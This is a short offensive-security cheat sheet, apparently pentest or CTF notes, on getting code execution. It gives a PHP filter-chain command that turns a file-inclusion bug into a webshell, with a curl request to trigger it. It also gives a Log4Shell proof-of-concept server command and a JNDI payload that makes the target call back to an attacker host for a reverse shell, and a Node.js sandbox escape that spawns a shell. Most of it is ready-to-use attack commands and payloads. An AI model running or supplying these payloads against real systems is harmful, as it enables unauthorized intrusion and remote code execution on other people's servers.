# Code Execution

PHP filter-chain LFI → RCE — when an LFI only lets you read files (no upload), the `php://filter` chain can mutate an included stream into executable PHP without ever writing to disk:

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]);?>'
# -> prints a long php://filter/convert.iconv...convert.base64-decode/resource=<anything> chain
curl 'http://<target>/index.php?page=<url-encoded-chain>&0=id'
```
Works because `include()` on a `php://filter` wrapper runs the final decoded bytes as PHP source — the target file just needs to exist to anchor the include, its contents don't matter.

Log4Shell (CVE-2021-44228) — any input that reaches a vulnerable Log4j2 `logger.info()`/similar call (chat messages, usernames, request headers — not just HTTP params) triggers a JNDI lookup against an attacker-controlled server, which can return a class that executes on load:
```bash
java -cp log4j-shell-poc.jar --userip <LHOST> --webport 8000 --lport 9001     # spins up the LDAP+HTTP server serving the malicious class
```
```
${jndi:ldap://<LHOST>:1389/a}
```
Send that string anywhere the app logs user-controlled text (a Minecraft chat message is a real historical example) — a shell callback on `--lport` means the payload executed.

Node.js sandbox escape via module-name variant — if a sandbox blocks `require("child_process")` by matching the literal string, Node's `node:` scheme prefix for core modules is functionally identical and often isn't in the blocklist:
```javascript
require('node:child_process').spawn('/bin/sh')
```
